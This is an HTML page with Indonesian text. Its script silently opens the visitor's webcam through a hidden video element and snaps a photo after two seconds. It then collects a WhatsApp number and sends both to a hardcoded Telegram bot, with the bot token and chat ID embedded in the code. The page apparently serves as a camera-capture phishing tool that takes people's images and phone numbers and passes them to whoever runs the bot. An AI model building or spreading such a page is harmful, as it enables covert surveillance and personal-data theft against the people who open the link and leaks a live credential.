<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Auto Foto & Kirim Telegram</title>
</head>
<body>
  <h2>Foto sedang diambil...</h2>
  <video id="video" width="300" autoplay style="display:none;"></video>
  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

  <div id="formContainer" style="display:none;">
    <h3>Masukkan Nomor WhatsApp</h3>
    <input type="text" id="waNumber" placeholder="Contoh: 6281234567890">
    <button id="send">Kirim ke Telegram</button>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    let imageBlob = null;

    // Akses kamera & ambil foto otomatis setelah 2 detik
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        setTimeout(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => {
            imageBlob = blob;
            document.getElementById('formContainer').style.display = 'block';
            document.querySelector('h2').textContent = "Foto berhasil diambil.";
          }, 'image/jpeg');
        }, 2000); // 2 detik tunggu sebelum ambil foto
      })
      .catch(err => {
        alert("Gagal mengakses kamera: " + err);
      });

    // Kirim ke Telegram
    document.getElementById('send').addEventListener('click', () => {
      const waNumber = document.getElementById('waNumber').value.trim();
      if (!waNumber || !imageBlob) {
        alert("Harap isi nomor WA dan pastikan foto berhasil diambil.");
        return;
      }

      const formData = new FormData();
      formData.append('chat_id', '7041008009');
      formData.append('caption', 'Nomor WhatsApp: ' + waNumber);
      formData.append('photo', imageBlob, 'photo.jpg');

      fetch('https://api.telegram.org/bot7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY/sendPhoto', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        alert("Berhasil dikirim ke Telegram!");
      })
      .catch(error => {
        alert("Gagal kirim ke Telegram: " + error);
      });
    });
  </script>
</body>
</html>
